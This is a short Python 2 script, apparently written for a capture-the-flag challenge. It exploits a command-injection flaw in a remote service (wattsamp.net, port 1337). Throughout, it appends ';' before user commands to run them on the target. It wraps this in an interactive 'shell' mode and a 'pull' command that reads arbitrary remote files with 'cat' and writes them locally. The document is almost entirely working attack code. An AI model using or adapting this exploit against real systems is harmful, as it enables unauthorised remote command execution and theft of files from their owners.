import socket
import time

host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	data = s.recv(1024)
	time.sleep(2)

	s.send(";"+cmd+"\n")
	data = s.recv(1024).strip()
	time.sleep(2)

	print(data)
	s.close()

def pull(remote_path,local_path):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	data = s.recv(1024)
	time.sleep(2)

	s.send(";cat " + remote_path + "\n")
	data = s.recv(1024)
	time.sleep(2)

	local_file = open(local_path,'w')
	local_file.write(data)

	local_file.close()
	s.close()

def help():
	print('shell                           ---Drop into an interactive shell and allow users to gracefully exit')
	print('pull <remote-path> <local-path> ---Download files')
	print('help                            ---Shows this help menu')
	print('quit                            ---Quit the shell')

if __name__ == '__main__':
	cd = ''#stroe the current directory

	while True:
		#Process command from user input
		input = raw_input('> ')
		cmd = input.split()[0]

		if cmd == 'shell':
			while True:
				shell_cmd = raw_input('\> ')
				# exit if cmd is quit or exit
				if shell_cmd == 'quit' or shell_cmd == 'exit':
					break
				elif shell_cmd.split()[0] == 'cd':
					cd = cd + shell_cmd + ';'

				#Otherwise run execute command
				execute_cmd(cd + shell_cmd)
		elif cmd == 'pull' and len(input.split()) == 3:
			remote_path = input.split()[1]
			local_path = input.split()[2]
			pull(remote_path,local_path)
		elif cmd == 'help':
			help()
		elif cmd == 'quit':
			break
		else:
			print('Invalid Command')
			help()
